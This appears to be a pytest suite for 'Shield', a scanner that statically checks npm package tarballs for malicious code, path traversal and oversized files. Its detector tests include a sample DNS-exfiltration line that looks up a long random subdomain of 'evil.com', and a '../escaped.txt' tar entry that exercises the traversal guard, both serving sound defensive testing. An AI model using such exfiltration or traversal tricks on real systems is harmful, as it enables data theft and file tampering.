"""Tests for Shield's package-file scan (download + extract + static analysis).

Uses small fixture tarballs in tests/fixtures/ instead of hitting the real
npm registry, so the suite runs offline. ``download_tarball`` is monkey-patched
to copy the appropriate fixture into the temp directory the scanner created.
"""
from __future__ import annotations

import os
import shutil
from pathlib import Path
from unittest.mock import patch

import pytest

from daemon.pillars import shield as shield_module
from daemon.pillars.shield import FILE_SCAN_WEIGHT, Shield

FIXTURES = Path(__file__).parent / "fixtures"
CLEAN_TGZ = FIXTURES / "clean-pkg-1.0.0.tgz"
EVIL_TGZ  = FIXTURES / "evil-pkg-1.0.0.tgz"


@pytest.fixture(autouse=True)
def _no_admin_config(monkeypatch):
    """Pin admin config to defaults — the file scan is enabled by default."""
    monkeypatch.setattr(shield_module, "get_admin_config", lambda: {})


def _mock_download(src: Path):
    """Build an async download_tarball replacement that copies *src* into place."""
    async def _impl(url: str, dest_path: str) -> bool:
        shutil.copyfile(src, dest_path)
        return True
    return _impl


# ── Clean package: file scan should contribute zero ──────────────────────────

@pytest.mark.asyncio
async def test_clean_package_file_scan_scores_zero(monkeypatch):
    monkeypatch.setattr(shield_module, "download_tarball", _mock_download(CLEAN_TGZ))
    score, flags, summary = await Shield().scan_package_files(
        "https://registry.npmjs.org/clean-pkg/-/clean-pkg-1.0.0.tgz"
    )
    assert score == 0.0
    assert flags == []
    assert summary["files_scanned"] == 1  # only index.js
    assert summary["skipped"] is None


# ── Malicious package: env-exfil-near-http pattern fires ─────────────────────

@pytest.mark.asyncio
async def test_env_exfil_pattern_detected_in_file(monkeypatch):
    monkeypatch.setattr(shield_module, "download_tarball", _mock_download(EVIL_TGZ))
    score, flags, summary = await Shield().scan_package_files(
        "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz"
    )
    assert "env_exfil_near_http" in flags
    assert "dns_long_subdomain" in flags
    assert score > 0
    assert summary["files_scanned"] >= 1
    assert summary["flags"] == len(flags)


# ── Temp directory cleanup is unconditional ──────────────────────────────────

@pytest.mark.asyncio
async def test_temp_dir_cleaned_up_on_success(monkeypatch):
    captured: list[str] = []
    real_mkdtemp = shield_module.tempfile.mkdtemp

    def _spy_mkdtemp(*args, **kwargs):
        d = real_mkdtemp(*args, **kwargs)
        captured.append(d)
        return d

    monkeypatch.setattr(shield_module.tempfile, "mkdtemp", _spy_mkdtemp)
    monkeypatch.setattr(shield_module, "download_tarball", _mock_download(CLEAN_TGZ))

    await Shield().scan_package_files("https://example.invalid/x.tgz")

    assert captured, "scan_package_files did not allocate a temp dir"
    for d in captured:
        assert not os.path.exists(d), f"temp dir {d} survived a successful scan"


@pytest.mark.asyncio
async def test_temp_dir_cleaned_up_on_extract_failure(monkeypatch):
    """If extraction throws, the finally block must still remove the temp dir."""
    captured: list[str] = []
    real_mkdtemp = shield_module.tempfile.mkdtemp

    def _spy_mkdtemp(*args, **kwargs):
        d = real_mkdtemp(*args, **kwargs)
        captured.append(d)
        return d

    monkeypatch.setattr(shield_module.tempfile, "mkdtemp", _spy_mkdtemp)
    monkeypatch.setattr(shield_module, "download_tarball", _mock_download(CLEAN_TGZ))

    with patch.object(Shield, "_safe_extract", side_effect=OSError("boom")):
        score, flags, summary = await Shield().scan_package_files("https://example.invalid/x.tgz")

    assert score == 0.0
    assert summary["skipped"] == "extract_failed"
    assert captured
    for d in captured:
        assert not os.path.exists(d)


# ── Admin config disables the file scan ──────────────────────────────────────

@pytest.mark.asyncio
async def test_file_scan_disabled_by_admin_config(monkeypatch):
    monkeypatch.setattr(shield_module, "get_admin_config",
                        lambda: {"package_file_scan": False})

    # If download_tarball gets called at all, the test fails: the scan must
    # short-circuit before any network or filesystem activity.
    async def _explode(*_a, **_kw):
        raise AssertionError("download_tarball must not be called when scan disabled")
    monkeypatch.setattr(shield_module, "download_tarball", _explode)

    score, flags, summary = await Shield().scan_package_files(
        "https://registry.npmjs.org/anything/-/anything-1.0.0.tgz"
    )
    assert score == 0.0
    assert flags == []
    assert summary["skipped"] == "disabled_by_admin"


# ── FILE_SCAN_WEIGHT actually applied in the combined score ──────────────────

@pytest.mark.asyncio
async def test_file_scan_weighted_into_overall_score(monkeypatch):
    monkeypatch.setattr(shield_module, "download_tarball", _mock_download(EVIL_TGZ))
    meta = {
        "dist-tags": {"latest": "1.0.0"},
        "versions": {"1.0.0": {
            "scripts": {},
            "dist": {"tarball": "https://registry.example.com/evil/-/evil-1.0.0.tgz"},
        }},
        "readme": "",
        "description": "",
    }
    result = await Shield().score("evil-pkg", package_metadata=meta)

    file_score = result.metadata["file_score"]
    assert file_score > 0
    # Lifecycle scripts and injection scores are zero in this fixture, so the
    # full PillarScore.score must equal file_score * FILE_SCAN_WEIGHT (capped).
    assert result.score == pytest.approx(min(file_score * FILE_SCAN_WEIGHT, 100.0), abs=0.01)
    # ScanResponse-bound metadata is populated for the VS Code panel.
    assert result.metadata["tarball_url"] == "https://registry.example.com/evil/-/evil-1.0.0.tgz"
    assert result.metadata["file_scan_summary"]["flags"] >= 2


# ── Path-traversal guard ─────────────────────────────────────────────────────

def test_safe_extract_rejects_path_traversal(tmp_path):
    """A tarball entry with ../ in its name must be refused, not silently extracted."""
    import io
    import tarfile

    bad_tgz = tmp_path / "bad.tgz"
    with tarfile.open(bad_tgz, "w:gz") as tf:
        data = b"pwned"
        info = tarfile.TarInfo(name="../escaped.txt")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))

    dest = tmp_path / "out"
    dest.mkdir()
    with pytest.raises(tarfile.TarError):
        Shield._safe_extract(str(bad_tgz), str(dest))


# ── hex_density pattern (line 533) ───────────────────────────────────────────

def test_hex_density_above_threshold_flagged() -> None:
    """File with > 5% hex escapes triggers hex_density flag in _scan_one_file (line 533)."""
    # 10 \x escapes (each 4 chars in source) in a 60-char string → density ~16%
    hex_chunk = "\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a"
    text = hex_chunk + "x" * 10
    hits = dict(Shield._scan_one_file(text))
    assert "hex_density" in hits


# ── dns_long_subdomain via _scan_one_file (line 527) ─────────────────────────

def test_dns_long_subdomain_pattern_detected() -> None:
    """_scan_one_file detects require('dns') near long random subdomain (line 527)."""
    text = "const dns = require('dns');\ndns.lookup('aBcDeFgHiJkLmN.evil.com', cb);"
    hits = dict(Shield._scan_one_file(text))
    assert "dns_long_subdomain" in hits


# ── Download failure path (line 435) ─────────────────────────────────────────

@pytest.mark.asyncio
async def test_download_failed_returns_zero(monkeypatch) -> None:
    """download_tarball returning False → (0.0, [], skipped='download_failed') (line 435)."""
    async def _fail(url: str, dest: str) -> bool:
        return False

    monkeypatch.setattr(shield_module, "download_tarball", _fail)
    score, flags, summary = await Shield().scan_package_files("https://example.com/pkg.tgz")
    assert score == 0.0
    assert flags == []
    assert summary["skipped"] == "download_failed"


# ── _tarball_url_from_metadata without latest tag (line 408) ─────────────────

def test_tarball_url_from_metadata_without_latest() -> None:
    """Falls back to first version's tarball when no dist-tags.latest present (line 408)."""
    meta = {
        "versions": {
            "1.0.0": {"dist": {"tarball": "https://example.com/pkg-1.0.0.tgz"}}
        }
    }
    url = Shield._tarball_url_from_metadata(meta)
    assert url == "https://example.com/pkg-1.0.0.tgz"


# ── fetch_install_scripts without latest tag (lines 580-581) ─────────────────

@pytest.mark.asyncio
async def test_fetch_install_scripts_without_latest() -> None:
    """Uses first version's scripts when dist-tags.latest is absent (lines 580-581)."""
    meta = {
        "versions": {
            "1.0.0": {"scripts": {"preinstall": "echo hello"}}
        }
    }
    scripts = await Shield().fetch_install_scripts("pkg", meta)
    assert "preinstall" in scripts
    assert scripts["preinstall"] == "echo hello"


# ── Oversized file skipped during dir scan (line 483) ────────────────────────

def test_scan_skips_oversized_file(tmp_path) -> None:
    """Files exceeding _FILE_SCAN_MAX_BYTES are not scanned (line 483)."""
    from daemon.pillars.shield import _FILE_SCAN_MAX_BYTES

    js_file = tmp_path / "big.js"
    js_file.write_bytes(b"x" * (_FILE_SCAN_MAX_BYTES + 1))

    score, flags, n = Shield()._scan_extracted_dir(str(tmp_path))
    assert score == 0.0
    assert n == 0  # oversized file is skipped, not counted


# ── Non-file/non-dir entries skipped in _safe_extract (line 459) ─────────────

def test_safe_extract_skips_non_file_dir_entries(tmp_path) -> None:
    """Symlink/hardlink tar entries are skipped in the path-traversal loop (line 459)."""
    import io
    import tarfile as _tarfile

    tgz = tmp_path / "mixed.tgz"
    with _tarfile.open(tgz, "w:gz") as tf:
        data = b"console.log(1);"
        info = _tarfile.TarInfo(name="package/index.js")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
        # Hardlink entry: isfile() and isdir() both return False → line 459 continue
        link = _tarfile.TarInfo(name="package/hardlink.js")
        link.type = _tarfile.LNKTYPE
        link.linkname = "package/index.js"
        tf.addfile(link)

    dest = tmp_path / "out"
    dest.mkdir()
    Shield._safe_extract(str(tgz), str(dest))  # must not raise


# ── Max-files limit in _scan_extracted_dir (lines 477, 499) ──────────────────

def test_scan_stops_at_max_files_limit(tmp_path) -> None:
    """_scan_extracted_dir stops after _FILE_SCAN_MAX_FILES files (lines 477, 499)."""
    from daemon.pillars.shield import _FILE_SCAN_MAX_FILES

    for i in range(_FILE_SCAN_MAX_FILES + 5):
        (tmp_path / f"file{i}.js").write_text("console.log(1);", encoding="utf-8")

    _score, _flags, n = Shield()._scan_extracted_dir(str(tmp_path))
    assert n == _FILE_SCAN_MAX_FILES


# ── OSError on file read is handled gracefully (lines 485-486) ───────────────

def test_scan_handles_oserror_on_file_read(tmp_path, monkeypatch) -> None:
    """OSError when reading a .js file is caught and the file is skipped (lines 485-486)."""
    from pathlib import Path as _Path
    from daemon.pillars import shield as shield_mod

    js_file = tmp_path / "boom.js"
    js_file.write_text("console.log(1);", encoding="utf-8")

    original_read = _Path.read_text

    def _explode(self, *args, **kwargs):
        if self.name == "boom.js":
            raise OSError("permission denied")
        return original_read(self, *args, **kwargs)

    monkeypatch.setattr(_Path, "read_text", _explode)
    score, flags, n = Shield()._scan_extracted_dir(str(tmp_path))
    assert n == 0  # file was skipped, not counted
